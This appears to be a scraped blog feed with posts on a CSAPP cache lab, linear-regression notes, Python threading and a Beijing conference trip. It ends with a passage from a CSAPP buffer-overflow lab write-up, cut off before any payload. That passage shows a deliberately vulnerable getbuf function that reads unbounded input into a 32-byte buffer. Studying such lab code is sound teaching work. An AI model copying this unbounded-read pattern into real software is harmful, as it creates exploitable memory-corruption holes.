<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>先总结Part A部分。虽然并没有完全动手写这个代码，仅仅是参考分析他人的代码(主要是没看懂trace文件和不知道怎么调用接口)，但对于cache的操作，通过上面分析源码的含义并参考书中的知识，大致有了比较深刻的理解。</p>
]]></content>
    
    <summary type="html">
    
      csapp
    
    </summary>
    
    
      <category term="csapp" scheme="http://xinqiu.me/tags/csapp/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning Note 1</title>
    <link href="http://xinqiu.me/2016/06/02/ml-1/"/>
    <id>http://xinqiu.me/2016/06/02/ml-1/</id>
    <published>2016-06-01T16:00:00.000Z</published>
    <updated>2016-06-04T06:43:49.000Z</updated>
    
    <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>

<blockquote>
<p>Coursera 上的Machine Learning 算得上是经典的机器学习入门课程，是由Andrew Ng大牛上的课。出于对机器学习的好奇，打算用Python来完成这门课的学习。</p>
</blockquote>
<h2 id="Supervised_learning__u76D1_u7763_u5B66_u4E60"><a href="#Supervised_learning__u76D1_u7763_u5B66_u4E60" class="headerlink" title="Supervised learning 监督学习"></a>Supervised learning 监督学习</h2><p>这里存在两种问题 <strong>regression</strong> 和 <strong>classification</strong>。前者是预测相关的问题，后者是分类相关的问题。</p>
<p>首先介绍的是监督学习，notes1中用房屋价格预测来介绍Linear Regression线性回归。这里因为没有数据集，所以我选择用ex<br>1中的<code>ex1data1.txt</code>来做演示。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
data <span class="token operator">=</span> np<span class="token punctuation">.</span>loadtxt<span class="token punctuation">(</span><span class="token string">'ex1data1.txt'</span><span class="token punctuation">,</span> delimiter<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>
m <span class="token operator">=</span> data<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
X <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">]</span>
y <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span>
plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> y<span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">,</span> linewidths<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Profit in $10,000s'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'Population of City in 10,000s'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>可以画出数据分布散点图。</p>
<a id="more"></a>
<p><img src="1.png" alt=""></p>
<p>机器学习的流程如下</p>
<pre><code>          +------------------+
          |                  |
          |     Training     |
          |       set        |
          |                  |
          +------------------+
                   ||
                   ||
          +--------\/--------+
          |                  |
          |     Learning     |
          |     algorithm    |
          |                  |
          +------------------+
                   ||
                   ||
          +--------\/--------+
          |                  |
          |    hypothesis    |
X +-------&gt;                  +-------&gt;  Y
          |                  |
          +------------------+
</code></pre><p>用大量的训练数据带入学习算法中进行学习，学习算法产生假设模型，通过假设模型，可以由未知数据X得出需要的Y。</p>
<h3 id="Linear_Regression__u7EBF_u6027_u56DE_u5F52"><a href="#Linear_Regression__u7EBF_u6027_u56DE_u5F52" class="headerlink" title="Linear Regression 线性回归"></a>Linear Regression 线性回归</h3><p>根据 <code>ex1data2.txt</code> 里的数据，因为有两个特征，所以可以写出假设模型</p>
<p>$$ h_{\theta } = \theta_{0}+ \theta_{1}x_{1}+\theta_{2}x_{2}$$</p>
<p>其中 $\theta_{i}$ 是线性方程的确定性参数(有点类似权重的东西？)。所以，假设 $ x_{0} = 1$, 从广义上可以定义假设方程</p>
<p>$$h_{\theta } =\sum_{n}^{i=0}\theta_{i}x_{i}=\theta^{T}x$$</p>
<p>其中 $\theta$ 和 $x$ 都是向量，$n$ 是输入变量的个数。</p>
<p>确定完假设模型，之后需要做的一件事是挑选学习 $\theta$。一个可靠的方法可以让 $h(x)$ 接近 $y$。为了评估假设模型与数据集的接近程度，定义了一个 <strong>cost function</strong>（代价函数）</p>
<p>$$ J(\theta )=\frac{1}{2}\sum_{m}^{i=1}(h_{\theta}(x^{(i)})-y^{(i)})^{2} $$</p>
<p>这是least-squares cost function，是 <strong>ordinary least squares regression model</strong> 的一部分。</p>
<h4 id="LMS_algorithm"><a href="#LMS_algorithm" class="headerlink" title="LMS algorithm"></a>LMS algorithm</h4><p>为了寻找合适的 $\theta$ 使 $J(\theta )$ 最小，可以使用LMS算法通过不断的改变 $\theta$ 来寻找合适的值。这里使用了 <strong>gradient descent algorithm</strong>(梯度递减算法)，更新 $\theta$ 的方式如下</p>
<p>$$ \theta_{j} := \theta_{j} -\alpha \frac{\partial }{\partial \theta_{j}}J(\theta) $$</p>
<p>其中，$\alpha$ 是 <strong>learning rate</strong>（学习率）, $\frac{\partial }{\partial \theta_{j}}J(\theta)$ 可以化简为<br>$$ \frac{\partial }{\partial \theta_{j}}J(\theta) = (h_{\theta}(x)-y)x_{j} $$</p>
<p>这样的更新规则称为LMS update rule(least mean squares),也称为Widrow-Hoﬀ learning rule.</p>
<p>$$  \theta_{j} := \theta_{j} + \alpha  (y^{(i)} -h_{\theta}(x^{(i)}))x_{j}^{(i)}$$</p>
<p>梯度递减这里提到了两种 <strong>batch gradient descent</strong> (批量梯度递减) 和 <strong>stochastic gradient descent</strong> (随机梯度递减)。</p>
<h4 id="The_normal_equations"><a href="#The_normal_equations" class="headerlink" title="The normal equations"></a>The normal equations</h4><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol>
<li><p><a href="http://cs229.stanford.edu/notes/cs229-notes1.ps" target="_blank" rel="external">CS229 notes1</a></p>
</li>
<li><p><a href="https://www.coursera.org/learn/machine-learning" target="_blank" rel="external">Coursera Machine Learning</a></p>
</li>
<li><p><a href="http://blog.csdn.net/lilyth_lilyth/article/details/8973972" target="_blank" rel="external">随机梯度下降（Stochastic gradient descent）和 批量梯度下降（Batch gradient descent ）的公式对比、实现对比</a></p>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      机器学习笔记
    
    </summary>
    
    
      <category term="machine-learning" scheme="http://xinqiu.me/tags/machine-learning/"/>
    
  </entry>
  
  <entry>
    <title>Python线程学习</title>
    <link href="http://xinqiu.me/2016/05/10/python-thread/"/>
    <id>http://xinqiu.me/2016/05/10/python-thread/</id>
    <published>2016-05-09T16:00:00.000Z</published>
    <updated>2016-11-27T02:00:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>Python2.7中有两个常用的多线程库Multiprocessing，Threading。在Python中，线程和进程的区别在于线程模块使用线程，进程模块使用进程233，不开玩笑，这是StackOverFlow上的解释。说重点，线程使用相同的内存空间，而进程使用不同的。这也就让进程之间传对象稍有点困难。当然，由于线程共享内存空间，那么必须要考虑线程安全。</p>
<h2 id="thread"><a href="#thread" class="headerlink" title="thread"></a>thread</h2><p>thread算是轻量级的线程模块，它提供较为底层的多线程实现方案。使用start_new_thread(function, args[, kwargs])实现线程。使用allocate_lock()可以得到一个锁对象，用acquire()和release()来加锁和释放锁，用locked()来判断释放有锁。一把锁只能被一个线程得到，所以利用锁可以避免多个线程对同一资源的同时操作。</p>
<a id="more"></a>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> thread
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

<span class="token keyword">def</span> <span class="token function">addLock</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 获得锁</span>
    <span class="token keyword">print</span> lock<span class="token punctuation">.</span>locked<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 判断是否有锁</span>
    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    lock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 释放锁</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock <span class="token operator">=</span> thread<span class="token punctuation">.</span>allocate<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 分配一个锁对象</span>
    thread<span class="token punctuation">.</span>start_new<span class="token punctuation">(</span>addLock<span class="token punctuation">,</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 开辟一个线程</span>
    thread<span class="token punctuation">.</span>start_new<span class="token punctuation">(</span>addLock<span class="token punctuation">,</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h2 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h2><p>threading作为一个更高级的模块，提供了一些thread没有的功能。threading中有两种锁，如threading.Lock()， threading.RLock()。</p>
<h3 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h3><p>这里lock和thread模块里类似。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading

<span class="token keyword">def</span> <span class="token function">addLock</span><span class="token punctuation">(</span>lock<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> lock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true"># lock.release()</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    lock <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>addLock<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t2 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>addLock<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>lock<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>以上代码演示了利用Threading模块来确定一把锁只能被获得一次。</p>
<h3 id="RLock"><a href="#RLock" class="headerlink" title="RLock"></a>RLock</h3><p>RLock是可重入锁（reentrant lock），acquire()能够不被阻塞的被同一个线程调用多次。要注意的是release()需要调用与acquire()相同的次数才能释放锁。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token punctuation">,</span>time

rlock<span class="token operator">=</span>threading<span class="token punctuation">.</span>RLock<span class="token punctuation">(</span><span class="token punctuation">)</span>
result<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'step1'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'step2'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">showresult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 查看当前线程</span>
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        step1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        step2<span class="token punctuation">(</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> result

<span class="token keyword">def</span> <span class="token function">clearresult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> result
    <span class="token keyword">if</span> rlock<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        result<span class="token operator">=</span>None
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        rlock<span class="token punctuation">.</span>release<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> threading<span class="token punctuation">.</span>current_thread<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> result

t1<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>showresult<span class="token punctuation">)</span>
t2<span class="token operator">=</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>clearresult<span class="token punctuation">)</span>

t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h3 id="Condition"><a href="#Condition" class="headerlink" title="Condition"></a>Condition</h3><p>条件同步机制是指：一个线程等待特定条件，而另一个线程发出特定条件满足的信号。 解释条件同步机制的一个很好的例子就是生产者/消费者（producer/consumer）模型。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/condition.png" alt=""></p>
<h3 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h3><p>信号量同步基于内部计数器，每调用一次acquire()，计数器减1；每调用一次release()，计数器加1.当计数器为0时，acquire()调用被阻塞。</p>
<h3 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h3><p>基于事件的同步是指：一个线程发送/传递事件，另外的线程等待事件的触发。在set()时， 其他线程就被唤醒执行。</p>
<p><img src="http://www.laurentluce.com/images/blog/threads/event.png" alt=""></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># coding=utf-8</span>

<span class="token keyword">import</span> threading<span class="token punctuation">,</span> time
<span class="token keyword">import</span> random

<span class="token keyword">class</span> <span class="token class-name">Producer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
  向列表中生产随机整数
  """</span>

  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    构造器

    @param integers 整数列表
    @param event 事件同步对象
    """</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>integers <span class="token operator">=</span> integers
    self<span class="token punctuation">.</span>event <span class="token operator">=</span> event

  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    实现Thread的run方法。在随机时间向列表中添加一个随机整数
    """</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
      integer <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>
      self<span class="token punctuation">.</span>integers<span class="token punctuation">.</span>append<span class="token punctuation">(</span>integer<span class="token punctuation">)</span>
      <span class="token keyword">print</span> <span class="token string">'%d appended to list by %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
      <span class="token keyword">print</span> <span class="token string">'event set by %s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#设置事件</span>
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#发送事件</span>
      <span class="token keyword">print</span> <span class="token string">'event cleared by %s'</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>name
      time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">Consumer</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token triple-quoted-string string">"""
   从列表中消费整数
  """</span>

  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    构造器

    @param integers 整数列表
    @param event 事件同步对象
    """</span>
    threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>integers <span class="token operator">=</span> integers
    self<span class="token punctuation">.</span>event <span class="token operator">=</span> event

  <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    实现Thread的run()方法，从列表中消费整数
    """</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
      self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#等待事件被触发</span>
      <span class="token keyword">try</span><span class="token punctuation">:</span>
        integer <span class="token operator">=</span> self<span class="token punctuation">.</span>integers<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> <span class="token string">'%d popped from list by %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>integer<span class="token punctuation">,</span> self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
      <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># catch pop on empty list</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    integers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    event <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1 <span class="token operator">=</span> Producer<span class="token punctuation">(</span>integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span>
    t2 <span class="token operator">=</span> Consumer<span class="token punctuation">(</span>integers<span class="token punctuation">,</span> event<span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t1<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
    t2<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
    
    <summary type="html">
    
      在无聊的实训期间学点想学的东西，关于线程
    
    </summary>
    
    
      <category term="python" scheme="http://xinqiu.me/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>我与北京与WOT 2016</title>
    <link href="http://xinqiu.me/2016/04/15/WOT2016/"/>
    <id>http://xinqiu.me/2016/04/15/WOT2016/</id>
    <published>2016-04-14T16:00:00.000Z</published>
    <updated>2016-04-17T03:29:22.000Z</updated>
    
    <content type="html"><![CDATA[<p>从小到大，之前都没去过北京。一是对故宫长城并没有什么兴趣(毕竟只对吃感兴趣括弧笑)，二是总觉得北京那算是大都市，自己还是太Low了。机缘巧合，得到了张WOT 2016的票，再三犹豫之后还是毅然决定踏上旅程。唉，还是准备不重复，当初还以为北京的火车票应该不是那么难买，结果就先买了去的车票，几天以后才买回程的票，结果因为买迟了，足足少在北京玩2个小时。</p>
<a id="more"></a>
<p>关于请假还是有个小插曲，感觉被书记故意刁难了。我先向班主任请假，班主任说要请示书记。书记一开始不同意，我就搞不懂了，大学生不出去走走，怎么才能了解外面的世界？然后又说去问专业老师或院长的意见。我就屁颠屁颠的去问了专业老师，专业老师觉得如果我想去就去玩玩好了，回头和书记说，却被驳回说要向院长申请。我又找专业老师，让他联系一下院长。倒是院长同意了，让我按照请假流程请假。回来请假的时候，书记又说要院长和专业老师的签字。我真的无语了，难怪我们学校信息学院这么烂，大部分老师都是认为学生这么垃圾，还是安心读书到时候大四去参加培训班之后找个外包公司安度晚年异或争取考研考公考事业编什么的。</p>
<p>第一次一个人出这么远的门，感觉爸妈都有点不是很放心。开始的紧张在脚踏北京的地上时就已经不在紧张了。感觉只要有手机，基本上就什么都不怕了。不管是买早饭还是用地图。</p>
<p>早早的来到了北京珠三角JW万豪酒店</p>
<p><img src="JW.jpg" alt=""></p>
<p>看到了广告牌</p>
<p><img src="1.jpg" alt=""></p>
<p>随后签到拿到了嘉宾牌，场外的人还挺多的。</p>
<p><img src="2.jpg" alt=""></p>
<p>第一次感受了这种氛围，大部分人都是工作的人，学生还是挺少的。大一曾经憧憬过运维这个职业，现在比较火的是DevOps。在开会之前的一段时间，我就开始闲逛时间，顺便各种关注微信公众号抽奖什么的233。一路的不少公司展区都被我搜刮了小礼品。AWS抽到的笔意外的好写。</p>
<p><img src="3.jpg" alt=""></p>
<p>这是主会场开会前每个座位上放的广告大礼包233.之后就是会议开始， 早上的是集中会议，虽然离我很遥远，但一些思想我觉得还是正确的。</p>
<p><img src="4.jpg" alt=""></p>
<p>中午在KFC用了次Apple Pay，小额免密，圆了一次绑上银行卡后一直没用的遗憾。</p>
<p>下午本来想去听C会场，结果一脸懵逼，全是人。只好去了人不是很多的B安全会场。看到了道哥，真的年轻。这些公司的PPT真的不是盖的，演讲的档次真的不一样，想到当年参加锐聘的比赛做的Keynote，简直黑历史。</p>
<p>之后因为要约一约北京的同学，就提前离开了会场。走前问了主办方才知道，原来我这个票是可以看两天的，被送票方骗了&gt; &lt;,不然就可以在北京多玩一天了。和同学吃了北京的烧烤，还挺有特色，果然每个地方的烧烤口味都是有区别的。</p>
<p><img src="5.jpg" alt=""></p>
<p><img src="6.jpg" alt=""></p>
<p>好想有机会再去北京玩玩，这次还有个遗憾是没吃炸酱面。北京之旅让我深有感触，加深了要更加努力的决心。在最近最不想学习的时候来了次北京打了针鸡血，但愿能维持长一段时间。</p>
]]></content>
    
    <summary type="html">
    
      仓促的北京之旅
    
    </summary>
    
    
      <category term="Life" scheme="http://xinqiu.me/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Lab3 解题分析</title>
    <link href="http://xinqiu.me/2016/03/30/csapp-lab3-buflab/"/>
    <id>http://xinqiu.me/2016/03/30/csapp-lab3-buflab/</id>
    <published>2016-03-29T16:00:00.000Z</published>
    <updated>2016-04-07T02:02:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>首先，使用tar xvf命令解压文件后，会有3个可执行的二进制文件bufbomb，hex2raw，makecookie。参考<a href="http://csapp.cs.cmu.edu/3e/buflab32.pdf" target="_blank" rel="external">write-up</a>。</p>
<!--toc-->
<h2 id="Level_0"><a href="#Level_0" class="headerlink" title="Level 0"></a>Level 0</h2><p>Bufbomb程序运行会读一个字符串，使用一下函数getbuf:</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* Buffer size for getbuf */</span>
<span class="token macro property">#<span class="token directive keyword">define</span> NORMAL_BUFFER_SIZE 32</span>

<span class="token keyword">int</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>NORMAL_BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>Gets函数和标准库的gets功能比较相似，是读取字符串。因为Gets没有办法判断是否buf足够大，所以要用一个函数去判断长度是否小于32。将字符串传入getbuf函数中，若字符串小于32，则返回1.</p>
<pre><code>080491f4 &lt;getbuf&gt;:
 80491f4:    55                       push   %ebp
 80491f5:    89 e5                    mov    %esp,%ebp
 80491f7:    83 ec 38                 sub    $0x38,%esp
 80491fa:    8d 45 d8                 lea    -0x28(%ebp),%eax
 80491fd:    89 04 24                 mov    %eax,(%esp)
 8049200:    e8 f5 fa ff ff           call   8048cfa &lt;Gets&gt;
 8049205:    b8 01 00 00 00           mov    $0x1,%eax
 804920a:    c9                       leave  
 804920b:    c3                       ret
</code></pre><p>getbuf是由函数test调用:</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
  <span class="token keyword">int</span> val<span class="token punctuation">;</span>   
  <span class="token comment" spellcheck="true">/* Put canary on stack to detect possiblecorruption */</span>   
  <span class="token keyword">volatile</span> <span class="token keyword">int</span> local <span class="token operator">=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   

  val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   

  <span class="token comment" spellcheck="true">/* Check for corruption stack */</span>   
  <span class="token keyword">if</span> <span class="token punctuation">(</span>local <span class="token operator">!=</span> <span class="token function">uniqueval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sabotaged!: the stack has beencorrupted\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
  <span class="token punctuation">}</span>   
  <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">{</span>   
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Boom!: getbuf returned0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
